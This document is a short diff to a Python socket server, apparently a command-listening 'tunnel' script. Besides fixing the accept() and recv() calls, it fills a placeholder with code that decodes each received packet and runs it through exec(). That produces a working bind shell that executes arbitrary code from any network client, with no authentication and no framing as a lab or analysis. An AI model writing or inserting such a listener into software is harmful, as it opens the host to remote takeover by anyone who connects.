@@ -11,13 +11,14 @@ tunnel.bind(server)
 tunnel.listen(5)
 
 while True:
-    client_address = tunnel.accept()
+    connection, client_address = tunnel.accept()
     try:
         ### Receive data in 1024 byte packages and execute commands ###
         while True:
-            data = connection.receive(1024)
+            data = connection.recv(1024)
             if data:
-                ### Insert script to run commands in recieved data here ###
+                data = data.decode()
+                exec(data)
             else:
                 break
     finally:
